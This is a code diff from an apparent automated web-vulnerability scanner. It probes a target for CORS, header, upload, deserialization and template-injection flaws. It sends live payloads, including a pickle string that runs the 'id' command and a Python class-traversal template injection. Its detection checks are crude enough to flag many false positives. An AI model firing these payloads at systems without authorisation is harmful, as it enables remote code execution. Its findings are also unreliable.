+        return vulnerabilities
+
+    def _check_cloud_exposure(self, content: str) -> bool:
+        """Check for cloud storage exposure indicators"""
+        exposure_indicators = [
+            '<ListBucketResult', '<Contents>', '<Key>', '<LastModified>',
+            'blob', 'container', 'storage', 'bucket'
+        ]
+        
+        return any(indicator in content for indicator in exposure_indicators)
+
+    async def _test_cors_misconfigurations(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for CORS misconfigurations"""
+        vulnerabilities = []
+        
+        try:
+            url = f"https://{target}"
+            
+            # Test CORS with various origins
+            test_origins = [
+                "https://evil.com",
+                "https://attacker.com",
+                "null",
+                "*",
+                f"https://sub.{target}",
+                f"https://{target}.evil.com"
+            ]
+            
+            for origin in test_origins:
+                try:
+                    headers = {'Origin': origin}
+                    
+                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                        async with session.get(url, headers=headers) as response:
+                            cors_headers = response.headers
+                            
+                            # Check for dangerous CORS configurations
+                            if self._check_cors_vulnerability(cors_headers, origin):
+                                vuln = AdvancedVulnerability(
+                                    type="CORS Misconfiguration",
+                                    severity="MEDIUM",
+                                    confidence=0.8,
+                                    url=url,
+                                    description=f"Dangerous CORS configuration allows origin: {origin}",
+                                    impact="Cross-origin data theft, credential theft",
+                                    recommendation="Configure restrictive CORS policies",
+                                    payload=f"Origin: {origin}",
+                                    evidence=f"Access-Control-Allow-Origin: {cors_headers.get('Access-Control-Allow-Origin', 'N/A')}"
+                                )
+                                vulnerabilities.append(vuln)
+                                
+                except Exception as e:
+                    logger.debug(f"CORS test error for origin {origin}: {str(e)}")
+                    
+        except Exception as e:
+            logger.error(f"Error testing CORS misconfigurations: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_cors_vulnerability(self, headers: dict, test_origin: str) -> bool:
+        """Check for CORS vulnerability"""
+        acao = headers.get('Access-Control-Allow-Origin', '')
+        acac = headers.get('Access-Control-Allow-Credentials', '').lower()
+        
+        # Dangerous configurations
+        if acao == '*' and acac == 'true':
+            return True
+        if acao == test_origin and 'evil' in test_origin:
+            return True
+        if acao == 'null':
+            return True
+            
+        return False
+
+    async def _test_security_headers(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for missing security headers"""
+        vulnerabilities = []
+        
+        try:
+            url = f"https://{target}"
+            
+            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                async with session.get(url) as response:
+                    headers = response.headers
+                    
+                    # Check for missing security headers
+                    security_headers = {
+                        'Strict-Transport-Security': 'HSTS header missing - allows protocol downgrade attacks',
+                        'Content-Security-Policy': 'CSP header missing - allows XSS and data injection',
+                        'X-Frame-Options': 'X-Frame-Options missing - allows clickjacking attacks',
+                        'X-Content-Type-Options': 'X-Content-Type-Options missing - allows MIME sniffing',
+                        'Referrer-Policy': 'Referrer-Policy missing - may leak sensitive URLs',
+                        'Permissions-Policy': 'Permissions-Policy missing - allows feature abuse'
+                    }
+                    
+                    for header, description in security_headers.items():
+                        if header not in headers:
+                            vuln = AdvancedVulnerability(
+                                type="Missing Security Header",
+                                severity="LOW" if header in ['Referrer-Policy', 'Permissions-Policy'] else "MEDIUM",
+                                confidence=0.9,
+                                url=url,
+                                description=description,
+                                impact="Various security risks depending on missing header",
+                                recommendation=f"Implement {header} security header",
+                                payload="N/A",
+                                evidence=f"Missing header: {header}"
+                            )
+                            vulnerabilities.append(vuln)
+                            
+        except Exception as e:
+            logger.error(f"Error testing security headers: {str(e)}")
+        
+        return vulnerabilities
+
+    async def _test_file_upload_vulnerabilities(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for file upload vulnerabilities"""
+        vulnerabilities = []
+        
+        try:
+            endpoints = recon_data.get('endpoints', [])
+            
+            # Look for upload endpoints
+            upload_endpoints = [ep for ep in endpoints if any(keyword in ep.lower() for keyword in ['upload', 'file', 'attach', 'media'])]
+            
+            for endpoint in upload_endpoints[:5]:
+                url = f"https://{target}{endpoint}" if not endpoint.startswith('http') else endpoint
+                
+                try:
+                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                        async with session.get(url) as response:
+                            content = await response.text()
+                            
+                            # Check for file upload forms
+                            if 'type="file"' in content.lower() or 'enctype="multipart/form-data"' in content.lower():
+                                vuln = AdvancedVulnerability(
+                                    type="File Upload Functionality",
+                                    severity="MEDIUM",
+                                    confidence=0.7,
+                                    url=url,
+                                    description="File upload functionality detected - requires manual testing",
+                                    impact="Potential for malicious file upload, RCE, defacement",
+                                    recommendation="Implement file type validation, size limits, and sandboxing",
+                                    payload="N/A",
+                                    evidence="File upload form detected"
+                                )
+                                vulnerabilities.append(vuln)
+                                
+                except Exception as e:
+                    logger.debug(f"File upload test error for {url}: {str(e)}")
+                    
+        except Exception as e:
+            logger.error(f"Error testing file upload vulnerabilities: {str(e)}")
+        
+        return vulnerabilities
+
+    async def _test_deserialization_vulnerabilities(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for deserialization vulnerabilities"""
+        vulnerabilities = []
+        
+        try:
+            endpoints = recon_data.get('endpoints', [])
+            
+            # Deserialization payloads for different technologies
+            deser_payloads = {
+                'java': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4',
+                'php': 'O:8:"stdClass":1:{s:1:"a";s:1:"b";}',
+                'python': "cos\nsystem\n(S'id'\ntR.",
+                'dotnet': '/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlgMltbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0'
+            }
+            
+            for endpoint in endpoints[:10]:
+                url = f"https://{target}{endpoint}" if not endpoint.startswith('http') else endpoint
+                
+                for tech, payload in deser_payloads.items():
+                    try:
+                        # Test in various parameters
+                        test_params = ['data', 'object', 'serialized', 'payload']
+                        
+                        for param in test_params:
+                            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+                            
+                            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                                async with session.get(test_url) as response:
+                                    content = await response.text()
+                                    
+                                    # Check for deserialization errors
+                                    if self._check_deserialization_errors(content, tech):
+                                        vuln = AdvancedVulnerability(
+                                            type="Deserialization Vulnerability",
+                                            severity="CRITICAL",
+                                            confidence=0.8,
+                                            url=test_url,
+                                            description=f"Potential {tech} deserialization vulnerability detected",
+                                            impact="Remote code execution, system compromise",
+                                            recommendation="Avoid deserializing untrusted data, use safe serialization",
+                                            payload=payload[:100] + "...",
+                                            evidence=content[:500]
+                                        )
+                                        vulnerabilities.append(vuln)
+                                        
+                    except Exception as e:
+                        logger.debug(f"Deserialization test error: {str(e)}")
+                        
+        except Exception as e:
+            logger.error(f"Error testing deserialization vulnerabilities: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_deserialization_errors(self, content: str, tech: str) -> bool:
+        """Check for deserialization error indicators"""
+        error_patterns = {
+            'java': ['java.io.InvalidClassException', 'java.lang.ClassNotFoundException', 'ObjectInputStream'],
+            'php': ['unserialize()', 'Notice: unserialize', 'Warning: unserialize'],
+            'python': ['pickle.loads', 'cPickle.loads', 'pickle.UnpicklingError'],
+            'dotnet': ['BinaryFormatter', 'SerializationException', 'System.Runtime.Serialization']
+        }
+        
+        patterns = error_patterns.get(tech, [])
+        content_lower = content.lower()
+        
+        return any(pattern.lower() in content_lower for pattern in patterns)
+
+    async def _test_template_injection(self, target: str, recon_data: Dict[str, Any]) -> List[AdvancedVulnerability]:
+        """Test for template injection vulnerabilities"""
+        vulnerabilities = []
+        
+        try:
+            endpoints = recon_data.get('endpoints', [])
+            
+            # Template injection payloads for different engines
+            template_payloads = [
+                "{{7*7}}",  # Jinja2, Twig
+                "${7*7}",   # Freemarker, Velocity
+                "<%=7*7%>", # ERB, JSP
+                "{{7*'7'}}", # Jinja2
+                "${7*'7'}",  # Freemarker
+                "#{7*7}",    # Ruby
+                "{{config}}",  # Flask/Jinja2 config exposure
+                "{{request}}", # Request object exposure
+                "${class.forName('java.lang.Runtime')}", # Java
+                "{{''.__class__.__mro__[2].__subclasses__()}}" # Python class traversal
+            ]
+            
+            for endpoint in endpoints[:10]:
+                url = f"https://{target}{endpoint}" if not endpoint.startswith('http') else endpoint
+                
+                for payload in template_payloads:
+                    try:
+                        # Test in URL parameters
+                        test_url = f"{url}?name={urllib.parse.quote(payload)}"
+                        
+                        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
+                            async with session.get(test_url) as response:
+                                content = await response.text()
+                                
+                                # Check for template injection
+                                if self._check_template_injection(content, payload):
+                                    vuln = AdvancedVulnerability(
+                                        type="Server-Side Template Injection (SSTI)",
+                                        severity="CRITICAL",
+                                        confidence=0.9,
+                                        url=test_url,
+                                        description=f"Template injection vulnerability detected with payload: {payload}",
+                                        impact="Remote code execution, information disclosure",
+                                        recommendation="Sanitize template inputs, use safe template engines",
+                                        payload=payload,
+                                        evidence=content[:500]
+                                    )
+                                    vulnerabilities.append(vuln)
+                                    
+                    except Exception as e:
+                        logger.debug(f"Template injection test error: {str(e)}")
+                        
+        except Exception as e:
+            logger.error(f"Error testing template injection: {str(e)}")
+        
+        return vulnerabilities
+
+    def _check_template_injection(self, content: str, payload: str) -> bool:
+        """Check for template injection indicators"""
+        # Check for mathematical evaluation
+        if "{{7*7}}" in payload and "49" in content:
+            return True
+        if "${7*7}" in payload and "49" in content:
+            return True
+        if "<%=7*7%>" in payload and "49" in content:
+            return True
+        if "#{7*7}" in payload and "49" in content:
+            return True
+        
+        # Check for string repetition
+        if "7*'7'" in payload and "7777777" in content:
+            return True
+            
+        # Check for config/request object exposure
+        if "{{config}}" in payload and ("SECRET_KEY" in content or "DEBUG" in content):
+            return True
+        if "{{request}}" in payload and ("headers" in content or "method" in content):
+            return True
+            
+        # Check for class traversal
+        if "__subclasses__" in payload and "class" in content:
+            return True
+            
+        return False
 
 # Additional methods would continue here...
 # This is a comprehensive foundation for the advanced professional hunter system
